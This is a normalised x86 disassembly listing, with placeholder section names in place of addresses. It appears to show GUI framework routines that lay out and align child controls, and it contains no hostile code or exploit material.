call [ ebx + 0x130 ]
sub_43c820
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_439090
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_43c854
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_43c94c
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_43944c
push ebx
push sub_43e2e4
call sub_41a8e4
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d24c
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_41d3f4
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_403428
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_458164
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_403ea8
lea eax [ ebx + 0x188 ]
call sub_403e54
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c953
lea eax [ ebp - 0x8 ]
call sub_403e54
retn
sub_43c953
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_43c978
push ebx
push esi
push edi
call sub_403490
mov ebx edx
mov edi eax
mov eax edi
call sub_419af4
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_4054f4
mov eax [ edi + 0x178 ]
call sub_403104
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_437ff8
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_43d618
mov eax edi
call sub_43d858
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_403104
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_43d81c
mov esi eax
mov edx esi
mov eax edi
call sub_43d684
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_43d858
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_439524
test bl bl
jle r-xdata
call sub_41a97c
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403478
sub_43ca48
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_43cb0c
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_413f0c
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403104
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_440ce8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_413d6c
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_413e60
mov edx esi
mov eax [ ebp - 0xc ]
call sub_413d6c
test eax eax
je r-xdata
sub_43cb1c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43d3c0
xor eax eax
push ebp
push sub_43cb5c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_439788
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cb63
mov eax [ ebp - 0x4 ]
call sub_43d3c8
retn
sub_43cb63
mov eax [ ebp - 0x4 ]
call sub_43ca48
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43e21c
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_43b4f4
sub_43cb98
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_43cbb3 ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_43cc24
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_440e2c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_412910
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_43cfa5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cfac
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_43ceba ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_43ce1d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_43cfac
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_43cfdb ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_43d064
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43d858
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_413c10
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_413d6c
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_43cc24
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_43d81c
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_413de8
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_413d6c
mov edx eax
mov ecx ebx
mov eax edi
call sub_43cb98
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_43d1d4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_43d858
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_43d81c
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_43d81c
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_43d228
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_43d1d4
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43d307
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_43d064
pop ecx
push ebp
mov al 0x2
call sub_43d064
pop ecx
push ebp
mov al 0x3
call sub_43d064
pop ecx
push ebp
mov al 0x4
call sub_43d064
pop ecx
push ebp
mov al 0x5
call sub_43d064
pop ecx
push ebp
mov al 0x6
call sub_43d064
pop ecx
push ebp
xor eax eax
call sub_43d064
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_403300
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403104
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_403300
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_43d32c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_440e2c
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43d3c0
xor eax eax
push ebp
push sub_43d3b3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_43d3c8
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_43d3f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43d4b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_439d50
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_43d858
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d4bc
mov eax [ ebp - 0xc ]
call sub_403104
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43d81c
mov edx eax
mov eax [ ebp - 0xc ]
call sub_413c10
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_439abc
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_413d6c
xor ecx ecx
mov edx 0xb03e
call sub_43b4f4
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43d81c
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_43d4c4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43d858
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_43d3c0
xor edx edx
push ebp
push sub_43d5ab
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_43d858
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_403300
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43d81c
mov edx eax
mov eax [ ebp - 0xc ]
call sub_413c10
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_413d6c
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_403104
mov eax [ ebp - 0x4 ]
call sub_43d3c8
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43d81c
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_439860
mov dl 0x4
call sub_439860
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_413c5c
sub_43d618
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4514e0
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_455204
sub_43d638
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_438c40
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_438c40
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_438c40
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_43d684
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_438c68
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_438c68
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_438c68
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_43d6cc
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403300
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_43b4f4
mov edx ebx
mov eax edi
call sub_43d638
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_43b4f4
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_43b4f4
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_43b4f4
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_43b4f4
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43b4f4
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov eax edi
call sub_440e2c
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_43b4f4
mov eax edi
call sub_43e21c
jmp r-xdata
mov edx ebx
mov eax edi
call sub_43d32c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43d7a0
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_43b4f4
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov eax esi
call sub_440e2c
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_43d618
mov eax ebp
call sub_43e080
jmp r-xdata
mov edx ebx
mov eax esi
call sub_43d684
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_43b4f4
mov eax esi
call sub_43d3e8
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43a794
sub_43d81c
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_413d6c
mov edx edi
mov eax ebp
call sub_413d6c
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
